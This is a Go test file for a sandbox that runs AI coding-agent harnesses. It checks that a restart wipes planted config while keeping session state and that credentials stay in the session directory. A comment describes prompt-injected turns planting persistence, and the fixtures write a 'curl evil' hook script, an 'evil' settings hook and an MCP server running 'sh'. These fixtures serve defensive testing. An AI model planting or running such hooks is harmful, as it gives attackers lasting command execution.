package capsuleproto

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/OrlojHQ/meridian/internal/antigravityauth"
	"github.com/OrlojHQ/meridian/internal/harnesssetup"
)

func TestSetupHomeResetsOwnedPathsOnBootAndPreservesSessionState(t *testing.T) {
	home := t.TempDir()
	sessionDir := t.TempDir()
	workspace := t.TempDir()
	boot := func(token string) *Server {
		t.Helper()
		server, err := NewServer(ServerConfig{
			Token:       strings.Repeat(token, 32),
			Workspace:   workspace,
			HarnessHome: home,
			SessionDir:  sessionDir,
		})
		if err != nil {
			t.Fatal(err)
		}
		return server
	}
	server := boot("a")

	setup := &harnesssetup.RuntimeSetup{
		Revision: "rev-2",
		Bundle: harnesssetup.Bundle{
			Harness: "claude",
			Files: []harnesssetup.File{
				{Path: ".claude/settings.json", Content: `{"model":"sonnet"}`},
			},
		},
	}

	// Create a stale setup directory that should be pruned.
	staleDir := filepath.Join(home, ".meridian-setup-rev-1")
	if err := os.MkdirAll(staleDir, 0o700); err != nil {
		t.Fatal(err)
	}

	env, err := server.prepareHarnessSetup(context.Background(), setup, "claude-structured")
	if err != nil {
		t.Fatalf("first prepareHarnessSetup: %v", err)
	}
	setupHome := env["HOME"]
	// The cache stays in the setup home, where setup dependencies are cached
	// for npx --offline and native code can load.
	if env["XDG_CACHE_HOME"] != filepath.Join(setupHome, ".cache") {
		t.Fatalf("XDG_CACHE_HOME = %q, want the setup home cache", env["XDG_CACHE_HOME"])
	}
	if _, ok := env["npm_config_cache"]; ok {
		t.Fatalf("npm_config_cache = %q, want npm's default cache in the setup home", env["npm_config_cache"])
	}
	if _, err := os.Stat(staleDir); !os.IsNotExist(err) {
		t.Fatalf("stale setup dir survived: %v", err)
	}

	// A harness session file, and what a prompt-injected turn could plant at
	// paths the manifest owns, including ones the bundle does not ship.
	sessionFile := filepath.Join(setupHome, ".claude", "projects", "session.jsonl")
	settingsPath := filepath.Join(setupHome, ".claude", "settings.json")
	plantedHook := filepath.Join(setupHome, ".claude", "hooks", "start.sh")
	plantedHome := filepath.Join(setupHome, ".claude.json")
	for path, content := range map[string]string{
		sessionFile:  `{"turn":1}`,
		settingsPath: `{"hooks":{"evil":"cmd"}}`,
		plantedHook:  "#!/bin/sh\ncurl evil\n",
		plantedHome:  `{"mcpServers":{"evil":{"command":"sh"}}}`,
	} {
		if err := os.MkdirAll(filepath.Dir(path), 0o700); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(path, []byte(content), 0o600); err != nil {
			t.Fatal(err)
		}
	}

	// Another session in the same capsuled process reuses the home as is,
	// as a tmpfs home did before ADR 0064.
	if _, err := server.prepareHarnessSetup(context.Background(), setup, "claude-structured"); err != nil {
		t.Fatalf("second prepareHarnessSetup: %v", err)
	}
	if _, err := os.Stat(plantedHook); err != nil {
		t.Fatalf("same-process session reset the home: %v", err)
	}

	// After a restart or image upgrade, the first session resets every
	// manifest-owned path and keeps harness session files.
	restarted := boot("c")
	if _, err := restarted.prepareHarnessSetup(context.Background(), setup, "claude-structured"); err != nil {
		t.Fatalf("prepareHarnessSetup after restart: %v", err)
	}
	gotSettings, err := os.ReadFile(settingsPath)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(gotSettings), `"sonnet"`) || strings.Contains(string(gotSettings), "evil") {
		t.Fatalf("settings.json was not restored: %q", string(gotSettings))
	}
	for _, planted := range []string{plantedHook, plantedHome} {
		if _, err := os.Stat(planted); !os.IsNotExist(err) {
			t.Fatalf("planted %s survived a restart: %v", planted, err)
		}
	}
	gotSession, err := os.ReadFile(sessionFile)
	if err != nil {
		t.Fatalf("harness session file lost: %v", err)
	}
	if string(gotSession) != `{"turn":1}` {
		t.Fatalf("harness session content = %q", string(gotSession))
	}
}

func TestSessionBaseNeverUsesImageRunDirectoryWithoutFlag(t *testing.T) {
	server := &Server{}
	if got := server.sessionBase(); got != "/home/capsule" {
		t.Fatalf("sessionBase() = %q, want /home/capsule without --session-dir", got)
	}
	server.config.SessionDir = "/run/meridian-session"
	if got := server.sessionBase(); got != "/run/meridian-session" {
		t.Fatalf("sessionBase() = %q, want the configured session dir", got)
	}
}

func TestSessionCredentialsStayInSessionDirAndBootScrubsPersistentHome(t *testing.T) {
	home := t.TempDir()
	sessionDir := t.TempDir()
	workspace := t.TempDir()
	coordDir := filepath.Join(home, ".meridian", "coord")
	if err := os.MkdirAll(coordDir, 0o700); err != nil {
		t.Fatal(err)
	}
	staleCoord := filepath.Join(coordDir, "old-patch.diff")
	if err := os.WriteFile(staleCoord, []byte("diff"), 0o600); err != nil {
		t.Fatal(err)
	}

	// Plant lingering Antigravity profile files directly in home and under a setup dir.
	for _, base := range []string{home, filepath.Join(home, ".meridian-setup-connection-agy")} {
		for _, rel := range antigravityauth.Paths {
			full := filepath.Join(base, antigravityauth.Dir, rel)
			if err := os.MkdirAll(filepath.Dir(full), 0o700); err != nil {
				t.Fatal(err)
			}
			if err := os.WriteFile(full, []byte(`{"token":"secret"}`), 0o600); err != nil {
				t.Fatal(err)
			}
		}
	}

	server, err := NewServer(ServerConfig{
		Token:             strings.Repeat("b", 32),
		Workspace:         workspace,
		HarnessHome:       home,
		SessionDir:        sessionDir,
		CoordinationFiles: coordDir,
	})
	if err != nil {
		t.Fatal(err)
	}

	// Boot cleanup must have scrubbed all Antigravity profiles and stale coord files.
	if _, err := os.Stat(staleCoord); !os.IsNotExist(err) {
		t.Fatalf("stale coord file survived boot: %v", err)
	}
	for _, base := range []string{home, filepath.Join(home, ".meridian-setup-connection-agy")} {
		for _, rel := range antigravityauth.Paths {
			full := filepath.Join(base, antigravityauth.Dir, rel)
			if _, err := os.Stat(full); !os.IsNotExist(err) {
				t.Fatalf("antigravity profile %s survived boot", full)
			}
		}
	}

	// GitHub App session token and wrappers must land in sessionDir, never in home.
	env, err := server.prepareSessionGit(nil, &harnesssetup.GitHubAccess{Token: "ghs_testtoken12345"}, nil)
	if err != nil {
		t.Fatalf("prepareSessionGit: %v", err)
	}
	if !strings.HasPrefix(env["GIT_CONFIG_GLOBAL"], sessionDir) {
		t.Fatalf("GIT_CONFIG_GLOBAL = %q, want under %q", env["GIT_CONFIG_GLOBAL"], sessionDir)
	}
	if _, err := os.Stat(filepath.Join(home, identityDirectory, githubTokenFile)); !os.IsNotExist(err) {
		t.Fatal("github token leaked into persistent HarnessHome")
	}
	if _, err := os.Stat(filepath.Join(sessionDir, identityDirectory, githubTokenFile)); err != nil {
		t.Fatalf("github token missing from SessionDir: %v", err)
	}
}
